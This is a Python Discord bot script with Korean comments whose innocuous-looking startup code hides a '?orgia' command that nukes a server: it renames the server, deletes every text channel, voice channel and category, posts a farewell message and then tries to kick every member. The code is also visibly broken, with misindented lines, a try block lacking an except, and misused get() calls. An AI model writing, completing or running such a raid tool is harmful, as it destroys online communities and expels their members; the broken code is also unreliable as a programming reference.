#머리

import discord, asyncio
from discord.ext import commands
import os
from discord.ext import commands
from discord.utils import get
import random
from dhooks import Webhook

client = commands.Bot(command_prefix = '?')

@client.event
async def on_ready():

  # [discord.Status.online = 온라인],[discord.Status.idle = 자리비움],[discord.Status.dnd = 다른용무],[discord.Status.offline = 오프라인]
  await client.change_presence(status=discord.Status.online)

  await client.change_presence(activity=discord.Game(name="치카치카"))
  #await client.change_presence(activity=discord.Streaming(name="스트림 방송중", url='링크'))
  #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="노래 듣는중"))
  #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="영상 시청중"))
  
  print("Aigis:",client.user.name,"819929289759653928:",client.user.id,"3:",discord.__version__)

@client.command()
async def orgia(ctx):
  every = get(ctx.guild.roles, name="@everyone")
  permissions = discord.Permissions()
  await every.edit(reason = None)
  owner = get(ctx.guild.owner.name)
  roles = get(ctx.guild.roles)
  await ctx.guild.edit(icon=None, name=f"{owner}님의 서버")
  for channel in ctx.guild.text_channels:
      await channel.delete()
  for channel in ctx.guild.voice_channels:
      await channel.delete()
  for channel in ctx.guild.categories:
      await channel.delete()
  await ctx.guild.create_category("채팅 채널")
  await ctx.guild.create_category("음성 채널")
  await every.edit(reason = None)
  name = '채팅 채널'
  name2 = '음성 채널'
  await ctx.guild.create_text_channel(name="일반")
  await ctx.guild.create_voice_channel(name="일반")
  channel = get(ctx.guild.channels, name="일반")
      await channel.send('끄읕') 
  for member in ctx.guild.members:
      try:
          await member.kick()
      
                
client.run(os.environ['token'])
